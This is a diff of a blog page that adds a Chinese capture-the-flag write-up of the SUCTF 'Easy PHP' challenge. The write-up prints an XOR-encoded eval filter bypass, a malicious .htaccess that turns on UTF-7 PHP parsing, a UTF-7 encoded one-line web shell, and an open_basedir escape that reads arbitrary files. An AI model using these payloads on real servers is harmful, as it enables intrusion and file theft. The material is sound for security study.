@@ -207,6 +207,273 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d66b21b329.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d66b21b329.html" class="post-title-link" itemprop="url">SUCTF-Easy-PHP笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-25 17:51:44" itemprop="dateCreated datePublished" datetime="2019-08-25T17:51:44+08:00">2019-08-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:15:44" itemprop="dateModified" datetime="2020-10-14T17:15:44+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="题目是一个源码审计"><a href="#题目是一个源码审计" class="headerlink" title="题目是一个源码审计:"></a>题目是一个源码审计:</h3><pre><code class="php+HTML">&lt;?php
+function get_the_flag(){
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+    if(!file_exists($userdir)){
+    mkdir($userdir);
+    }
+    if(!empty($_FILES[&quot;file&quot;])){
+        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];
+        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];
+        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);
+    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); 
+        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);
+    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); 
+        $path= $userdir.&quot;/&quot;.$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+
+$hhh = @$_GET[&#39;_&#39;];
+
+if (!$hhh){
+    highlight_file(__FILE__);
+}
+
+if(strlen($hhh)&gt;18){
+    die(&#39;One inch long, one inch strong!&#39;);
+}
+
+if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )
+    die(&#39;Try something else!&#39;);
+
+$character_type = count_chars($hhh, 3);
+if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);
+
+eval($hhh);
+?&gt;</code></pre>
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><ul>
+<li><p>对GET传入字符做出了长度限制不得超过18,使用一个正则过滤了<code>自然数、英文字符,x00,X7F,反引号,&quot;,&#39;,_,&amp;,.,逗号</code>。</p>
+</li>
+<li><p><code>count_chars(string,3)</code>取出不同字符的个数，并且设置不得大于12个。最后<code>eval()</code>执行。按照题目的意思是要构造一个能够调用<code>get_the_flag()</code>上面这个自定义函数的方法，上传shell.</p>
+</li>
+<li><p>绕过get_the_flag()直接使用<code>.htaccess</code>方法执行php</p>
+</li>
+</ul>
+<h4 id="绕过限制执行任意函数"><a href="#绕过限制执行任意函数" class="headerlink" title="绕过限制执行任意函数"></a>绕过限制执行任意函数</h4><ul>
+<li><p>这里参考了一篇文章：<a href="https://xz.aliyun.com/t/5677#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-9</a></p>
+</li>
+<li><p>使用<code>0xff</code>异或得到<code>=&gt;_GET</code>进行调用这里写了个脚本对这个结果进行爆破:</p>
+</li>
+</ul>
+<pre><code class="python">def bypass():
+    minn = 1000000000
+    G = []
+    E = []
+    T = []
+    _ = []
+    str_1 = r&#39;\&#39;&quot;`~_&amp;.,|=[0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
+    str_2 = []
+    for i in str_1:
+        str_2.append(ord(i))
+    str_3=&#39;0123456789abcdef&#39;#构造16进制所含字符
+    str_0x16 = []
+    &#39;&#39;&#39;构造16进制&#39;&#39;&#39;
+    for i in str_3:
+        for j in str_3:
+            tmp =  &#39;0x&#39;+i+j
+            str_0x16.append(tmp)
+    for i in str_0x16:
+        #for j in str_0x16:
+            j = &quot;0xff&quot;
+            tmp_1 = int(i,16)
+            tmp_2 = int(&quot;0xff&quot;,16)
+
+​```
+        if (tmp_1 in str_2) or (tmp_2 in str_2) or (0&lt;=tmp_1&lt;=32) or (0&lt;=tmp_2&lt;=32) or (tmp_1==127) or (tmp_2==127):
+            continue
+        if tmp_1^tmp_2==ord(&#39;G&#39;):
+            print(&#39;G=&gt;&#39;+i+&quot;^&quot;+j)
+        if tmp_1^tmp_2==ord(&#39;E&#39;):
+            print(&#39;E=&gt;&#39;+i+&quot;^&quot;+j)
+        if tmp_1^tmp_2==ord(&#39;T&#39;):
+            print(&#39;T=&gt;&#39;+i+&quot;^&quot;+j)
+        if tmp_1^tmp_2==ord(&#39;_&#39;):
+            print(&#39;_=&gt;&#39;+i+&quot;^&quot;+j)
+
+
+bypass()</code></pre>
+<ul>
+<li>输出结果</li>
+</ul>
+<pre><code class="python">_=&gt;0xa0^0xff
+T=&gt;0xab^0xff
+G=&gt;0xb8^0xff
+E=&gt;0xba^0xff
+[Finished in 0.2s]</code></pre>
+<ul>
+<li>那么可以构造payload:</li>
+</ul>
+<pre><code class="visual">${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=phpinfo
+${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661474033546.png" alt></p>
+<ul>
+<li>正好拿WEB1的表单作为上传</li>
+</ul>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+    &lt;title&gt;Upload Labs&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h2&gt;Upload Labs&lt;/h2&gt;
+    &lt;form action=&quot;http://47.111.59.243:9001/?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;label for=&quot;file&quot;&gt;upload&lt;/label&gt;
+        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
+        &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;upload&quot;&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;</code></pre>
+<h4 id="绕过get-the-flag-函数"><a href="#绕过get-the-flag-函数" class="headerlink" title="绕过get_the_flag()函数"></a>绕过<code>get_the_flag()</code>函数</h4><p>  该函数主要过滤了ph文件后缀，但没有过滤其他文件后缀，而文件内容则过滤&lt;?,并且使用<code>exif_imagetype</code>对文件进行了判断是否为图片,考虑php7已经抛弃了<code>&lt;script language=&#39;php&#39;&gt;</code>和&lt;<code>%</code></p>
+<p>  所以可以使用UTF-7进行攻击。即上传<code>.htaccess</code>设置如下代码：</p>
+<pre><code class="C">  #define 4c11f3876d494218ff327e3ca6ac824f_width 1337
+  #define 4c11f3876d494218ff327e3ca6ac824f_height 1337
+  AddType application/x-httpd-php .aaa #将后缀为.aaa的解析为php
+  php_flag display_errors on #关闭报错
+  php_flag zend.multibyte 1
+  php_value zend.script_encoding &quot;UTF-7&quot; #设置解码UTF-7</code></pre>
+<p>  绕过<code>exif_imagetype</code>的检测，首先看一下这个函数的文档说明（图1），该函数读取图像的第一个字节，也就是说读取图片文件头，如果这个文件头是PHP自带的常量那么就可以通过检测。PHP常量如（图二）,只能使用xbm图片常量而其他常量都会导致<code>.htaccess</code>无法解析。因为XBM图片使用C代码作为表示，也就是在文件头定义两个常量分别是宽和高。这样既可绕过图片头检测。</p>
+<pre><code class="C">  #define test_width 16
+  #define test_height 7</code></pre>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20190819/15661483646268.png" alt></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20190819/15661482481850.png" alt></p>
+<p>这样就成功上传了<code>.htaccess</code>文件，但是构造shell并不能直接上传因为过滤&lt;?，但是我们上面设置了解码<code>UTF-7</code>，那么我们就可以构造<code>UTF-7</code>编码的payload(<a href="http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7</a>).</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661488438097.png" alt></p>
+<ul>
+<li><p>UTF-7一句话木马</p>
+<p>我们将木马同样上传上去，注意后缀为.aaa直接上菜刀连接。</p>
+</li>
+</ul>
+<pre><code>#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
+#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
++ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;a&#39;+AF0)+ADs?+AD4-</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661494271641.png" alt></p>
+<p>也可以使用phpinfo进行测试是否执行成功代码。</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661495566481.png" alt></p>
+<h4 id="open-basedir绕过bypass"><a href="#open-basedir绕过bypass" class="headerlink" title="open_basedir绕过bypass"></a>open_basedir绕过bypass</h4><p>  <code>open_basedir</code>是php.ini中对目录进行授权的设置，使用菜刀连上后发现无法访问其他目录。所以考虑bypass<code>open_basedir</code>,这是一个外国大佬在今年四月份放出来的payload，具体原理我也不懂（—_—）.</p>
+<p>  新建一个php文件，写入如下代码即可列出任意目录文件列表。</p>
+<pre><code class="PHP">&lt;?php
+ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
+mkdir(&#39;/tmp/fuck/&#39;);
+chdir(&#39;/tmp/fuck/&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
+chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
+var_dump(scandir(&#39;/&#39;));
+?&gt;</code></pre>
+<p>可以看到flag文件名直接将<code>scandir</code>改成<code>file_get_contents()</code>读取flag</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661500221290.png" alt></p>
+<pre><code class="php">&lt;?php
+ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
+mkdir(&#39;/tmp/fuck/&#39;);
+chdir(&#39;/tmp/fuck/&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
+chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);
+chdir(&#39;..&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
+var_dump(file_get_contents()(&#39;THis_Is_tHe_F14g&#39;));
+?&gt;</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661918208968.png" alt></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d61ff4cabe.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -940,7 +1207,7 @@ and ascii(mid((select table_name from information_schema.tables where table_sche
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-count">65</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -953,7 +1220,7 @@ and ascii(mid((select table_name from information_schema.tables where table_sche
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1011,12 +1278,12 @@ and ascii(mid((select table_name from information_schema.tables where table_sche
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">231k</span>
+    <span title="站点总字数">235k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:30</span>
+    <span title="站点阅读时长">3:33</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
